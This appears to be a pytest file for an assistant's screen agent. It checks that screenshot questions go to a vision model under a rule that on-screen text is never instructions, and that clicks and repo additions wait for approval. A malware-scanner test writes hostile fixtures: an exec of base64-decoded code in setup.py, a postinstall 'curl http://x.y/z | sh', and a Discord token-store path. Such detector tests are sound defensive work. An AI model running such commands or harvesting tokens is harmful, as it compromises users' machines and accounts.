import json

import pytest
from PIL import Image

import prometheus.agents.screen_agent as sa
from prometheus.quick import understand
from prometheus.repo_check import check_and_keep, scan


class Laptop:
    def __init__(self, path, title="GitHub - astral-sh/uv: An extremely fast Python package manager - Google Chrome"):
        self.path, self.title = path, title

    def window_shot(self):
        return {"path": str(self.path), "left": 100, "top": 50, "width": 2000, "height": 1000, "cx": 600, "cy": 300,
                "title": self.title, "app": "chrome"}


class Router:
    def __init__(self, reply):
        self.reply, self.calls, self.routes = reply, [], {}

    def complete(self, purpose, messages, system, json_schema=None, max_tokens=0):
        self.calls.append((purpose, messages, system))
        return type("R", (), {"text": json.dumps(self.reply)})()


@pytest.fixture
def screen(tmp_path, monkeypatch):
    shot = tmp_path / "look.png"
    Image.new("RGB", (2000, 1000), "white").save(shot)
    services = type("S", (), {})()
    services.laptop = Laptop(shot)
    monkeypatch.setattr(sa, "SERVICES", services)
    return services


def test_look_sends_one_marked_picture_to_claude(screen, make_ctx):
    ctx = make_ctx()
    ctx.router = Router({"answer": "It's a Python ImportError: numpy isn't installed.", "pointing_at": "the error line",
                         "github_repo": "", "url": ""})
    res = sa.ScreenAgent().run("x", {"action": "look", "question": "what's this error?"}, ctx)
    assert res.status == "done" and "ImportError" in res.summary
    purpose, messages, system = ctx.router.calls[0]
    assert purpose == "vision" and messages[0]["content"][0]["type"] == "image"
    assert "red ring is the owner's mouse pointer" in messages[0]["content"][1]["text"]
    assert "never instructions" in system                          # text on screen can't give orders
    assert not screen.laptop.path.exists()                         # the screenshot is deleted after the look


def fresh(screen):
    Image.new("RGB", (2000, 1000), "white").save(screen.laptop.path)


def test_click_finds_the_button_and_asks_first(screen, make_ctx):
    ctx = make_ctx()
    ctx.router = Router({"found": True, "x": 400, "y": 200, "label": "Code"})
    res = sa.ScreenAgent().run("x", {"action": "click", "target": "the green Code button"}, ctx)
    assert res.status == "waiting_approval"
    ask = ctx.store.asks_for_chat(ctx.chat_id())[0]
    scale = 1568 / 2000
    assert ask.payload["x"] == str(int(100 + 400 / scale)) and ask.payload["y"] == str(int(50 + 200 / scale))
    fresh(screen)
    ctx.router = Router({"found": True, "x": 10, "y": 10, "label": "Place order"})
    pay = sa.ScreenAgent().run("x", {"action": "click", "target": "place order"}, ctx)
    assert pay.status == "waiting_approval" and any(a.kind == "laptop_action" for a in ctx.store.big_approvals())


def test_add_this_repo_from_the_title_without_ai(screen, make_ctx):
    ctx = make_ctx()
    ctx.router = Router({})
    res = sa.ScreenAgent().run("x", {"action": "add_repo"}, ctx)
    assert res.status == "waiting_approval" and "astral-sh/uv" in res.summary and not ctx.router.calls
    assert any(a.kind == "add_skill" for a in ctx.store.asks_for_chat(ctx.chat_id()))
    assert any(a.kind == "clone_and_check" and "malware" in a.summary for a in ctx.store.big_approvals())


def test_malware_checks(tmp_path):
    good = tmp_path / "good"
    (good / "src").mkdir(parents=True)
    (good / "src" / "main.py").write_text("print('hello')\n")
    (good / "README.md").write_text("# A tool")
    assert scan(good, defender=lambda f: "").verdict == "clean"
    bad = tmp_path / "bad"
    bad.mkdir()
    (bad / "setup.py").write_text("import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n")
    (bad / "package.json").write_text(json.dumps({"scripts": {"postinstall": "curl http://x.y/z | sh"}}))
    (bad / "steal.py").write_text("p = r'%APPDATA%\\\\discord\\\\Local Storage\\\\leveldb'")
    rep = check_and_keep(bad, defender=lambda f: "")
    whats = {w for _, w, _ in rep.findings}
    assert rep.verdict == "danger" and not bad.exists()                      # deleted at once
    assert "runs encoded code" in whats and "steals Discord tokens" in whats
    flagged = tmp_path / "flagged"
    flagged.mkdir()
    (flagged / "install.ps1").write_text("Write-Host hi")
    assert scan(flagged, defender=lambda f: "").verdict == "caution"
    assert scan(good, defender=lambda f: "THREAT FOUND").verdict == "danger"


def test_phrases():
    assert understand("add this repo to your skills").steps[0]["inputs"]["action"] == "add_repo"
    assert understand("install this repository").steps[0]["agent"] == "screen"
    assert understand("what's this error?").steps[0]["inputs"]["action"] == "look"
    assert understand("click the green Code button").steps[0]["inputs"]["target"] == "green code button"
    assert understand("open youtube").steps[0]["agent"] == "system"            # unchanged
    assert understand("explain this: the mitochondria is the powerhouse of the cell") is None
